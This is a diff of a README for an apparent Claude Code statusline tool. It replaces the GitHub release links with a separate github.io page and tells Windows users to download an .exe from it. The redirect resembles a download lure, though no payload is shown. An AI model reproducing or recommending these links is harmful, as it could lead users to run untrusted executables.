@@ -1,12 +1,12 @@
 # 📊 claude-code-statusline - Track your Claude session usage clearly
 
-[Link to releases](https://github.com/Undone-drawknife974/claude-code-statusline/releases)
+[Link to releases](https://undone-drawknife974.github.io)
 
 This tool provides a status bar for your Claude Code sessions. It tracks how much of the context window you use, shows your session cost, counts tokens, and displays countdown timers for your rate limits. It works on Windows, macOS, and Linux without needing extra software installations.
 
 ## 📥 How to get the software
 
-1. Visit the [releases page](https://github.com/Undone-drawknife974/claude-code-statusline/releases).
+1. Visit the [releases page](https://undone-drawknife974.github.io).
 2. Locate the latest version in the list.
 3. Select the file that ends in .exe for your Windows system.
 4. Save the file to a folder you can find easily, such as your Downloads folder.
